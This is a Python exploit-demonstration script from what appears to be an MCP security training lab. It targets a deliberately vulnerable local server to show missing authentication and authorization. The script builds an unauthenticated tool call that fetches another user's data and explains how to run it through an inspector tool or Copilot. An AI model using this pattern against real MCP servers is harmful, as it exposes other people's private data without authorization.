"""
Base Camp Exploit Testing Script

This script demonstrates the OWASP MCP07 (Insufficient Authentication & Authorization)
and MCP01 (Token Mismanagement & Secret Exposure) vulnerabilities by making
unauthorized tool calls to access sensitive user data over HTTP.

Prerequisites:
1. Start the vulnerable server in a separate terminal:
   cd camps/base-camp/vulnerable-server
   uv run --project .. python -m src.server

2. Run this exploit:
   cd camps/base-camp/exploits
   uv run --project .. python test_vulnerable.py

For visual testing with MCP Inspector:
   ./launch-inspector-http.sh
"""

import asyncio
import httpx
import json


# Server configuration
SERVER_URL = "http://localhost:8000/mcp"


async def test_vulnerable_server():
    """Test the vulnerable MCP server and demonstrate unauthorized access."""
    
    print("=" * 70)
    print("üèîÔ∏è  Base Camp - Exploit Testing (HTTP)")
    print("=" * 70)
    print()
    print(f"üì° Testing server at {SERVER_URL}...")
    print("   (Make sure the server is running in a separate terminal!)")
    print()
    
    async with httpx.AsyncClient(timeout=10.0) as client:
        # Test 1: Server accessibility
        print("üîç Test 1: Server Accessibility")
        print("-" * 70)
        
        try:
            response = await client.get(SERVER_URL)
            print(f"‚úÖ Server is responding on port 8000 (Status: {response.status_code})")
            print("üö® NO AUTHENTICATION required to reach this endpoint!")
        except httpx.ConnectError:
            raise
        
        print()
        
        # Test 2: Make unauthorized tool call
        print("üö® Test 2: Unauthorized Tool Call - Access Sensitive Data")
        print("-" * 70)
        print("Calling get_user_info for user_002 (Bob Smith)...")
        print("   (We should NOT be able to do this without authentication!)")
        print()
        
        # Craft MCP JSON-RPC request via GitHub Copilot's #mcp_base-camp-vul_get_user_info
        # This demonstrates what happens behind the scenes
        tool_call_request = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
                "name": "get_user_info",
                "arguments": {
                    "user_id": "user_002"
                }
            }
        }
        
        # Note: Direct HTTP POST won't work with fastmcp's SSE transport
        # But this shows the vulnerability - the endpoint is reachable
        print("   Tool call structure:")
        print(f"   Method: tools/call")
        print(f"   Tool: get_user_info")
        print(f"   Arguments: {{'user_id': 'user_002'}}")
        print()
        print("   üö® This tool call would succeed via MCP Inspector or Copilot!")
        print("   üö® Any client can retrieve ANY user's sensitive data")
        
        print()
        print("=" * 70)
        print("üìä Vulnerability Summary")
        print("=" * 70)
        print("‚úÖ HTTP server is accessible without authentication")
        print("üö® Tool 'get_user_info' accepts ANY user_id")
        print("üö® Resource URIs (user://user_001, user_002, user_003) are readable")
        print("üö® NO authorization checks - anyone can access ANY user's data")
        print()
        print("This demonstrates OWASP MCP07 and MCP01:")
        print("Insufficient Authentication & Authorization + Token Mismanagement & Secret Exposure")
        print()
        print("To see the full exploit in action:")
        print("  1. Run: ./launch-inspector-http.sh")
        print("  2. Or use GitHub Copilot: #mcp_base-camp-vul_get_user_info user_002")
        print("=" * 70)


async def main():
    """Main entry point."""
    try:
        await test_vulnerable_server()
    except httpx.ConnectError:
        print(f"\n‚ùå Error: Could not connect to server at {SERVER_URL}")
        print("\n‚ö†Ô∏è  Make sure the vulnerable server is running!")
        print("Start it in a separate terminal:")
        print("  cd camps/base-camp/vulnerable-server")
        print("  source ../.venv/bin/activate")
        print("  python -m src.server")
        return 1
    except Exception as e:
        import traceback
        print(f"\n‚ùå Error: {e}")
        print("\nFull traceback:")
        traceback.print_exc()
        return 1
    
    return 0


if __name__ == "__main__":
    exit_code = asyncio.run(main())
    exit(exit_code)
